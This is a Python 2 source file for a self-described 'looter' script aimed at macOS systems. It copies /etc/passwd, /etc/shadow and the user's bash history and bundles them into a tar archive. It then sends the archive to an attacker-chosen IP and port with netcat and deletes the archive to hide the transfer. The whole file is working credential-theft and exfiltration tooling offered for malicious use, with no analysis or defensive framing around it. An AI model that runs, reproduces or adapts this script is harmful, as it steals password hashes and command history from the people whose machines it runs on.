################
### Includes ###
################

# Command Line Parsing
import argparse

# Platform Detection
import platform

# Creating Files / Path Checks
import os

# Tarfile Module
import tarfile

# Used for system calling
import subprocess

#################
### Functions ###
#################

# Determines platform being run
# Exits program if platform is not supported
def os_check():
    plat = platform.system()
    if(plat == "Darwin"):
        return plat
    else:
        print "Platform not supported"
        exit(1)

# Determines directory path of script
def nest_egg():
    return os.path.dirname(os.path.abspath(__file__));

# Run all the collections
def robbery(osinfo,path):
    files = filecollections(path)
    final = []
    for entry in files:
        head, tail = os.path.split(entry)
        final.append(tail)

    tar(path,final)

    if not args.noexfil:
        exfil(path)
    
    return;

# Attempts to copy each collection file into nest egg directory
# Prints out failed copies
def filecollections(path):
    files = ["/etc/passwd","/etc/shadow","~/.bash_history"]
    existing = []
    for fname in files:
        cmd = "cp " + fname + " " + path.replace(" ", "\ ") + "/"
        if execute(cmd) != -1:
            existing.append(fname)
        else:
            print "Failed to extract: " + fname

    return existing;

# Function for executing shell process commands i.e. cp / rm
def execute(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    output = process.communicate()[0]
    exitCode = process.returncode

    if (exitCode == 0):
        return output;
    else:
        return -1;

# Compress files into tar
def tar(path,files):

    tar = tarfile.open(path+"/nestegg.tar", "w:gz")

    for file in files:
        filepath = path+"/"+file
        if os.path.isfile(filepath):
            tar.add(file)
            os.system("rm "+file)
        else:
            print filepath + " was not found!"
    tar.close()

    return;

# Exfiltrate tar file
def exfil(path):

    path = path.replace(" ", "\ ")

    # Generates and executes cmd for exfil
    cmd = "nc -w 3 " + args.target + " " + args.port + " < " + path + "/nestegg.tar"
    execute(cmd)

    # Generates and executes cmd for removing tar file
    cmd = "rm " + path + "/nestegg.tar"
    execute(cmd)

    return;

##############################
### Command Line Arguments ###
##############################

argparser = argparse.ArgumentParser(description='Looter script, collects juicy data for malicious use.')
argparser.add_argument('-a','--all', action='store_true', help='perform all collections')
argparser.add_argument('-ne','--noexfil', action='store_true', help='disable exfil feature, drop tar file in dir')
argparser.add_argument('-d','--dir', action='store', dest='path', help='specify nest egg path')
argparser.add_argument('-t','--target', action='store', dest='target', help='specify exfil ip address (IPv4 only)')
argparser.add_argument('-p','--port', action='store', dest='port', help='specify exfil port number')
args = argparser.parse_args()

####################
### Main Program ###
####################

# Checks to make sure ip and port is specified, unless -ne is specifed
if (not args.target or not args.port) and not args.noexfil:
    print "Specify an IP address and port for exfil using -t and -p"
    exit(2)

# Calls platform information function
plat = os_check()

# Checks if -d is specified for a specific drop path
# If -d not specified, automatically drop in script pwd
if not args.path:
    args.path = nest_egg()

# Argument tree
robbery(plat,args.path)
        
# End Program
exit(0)
    











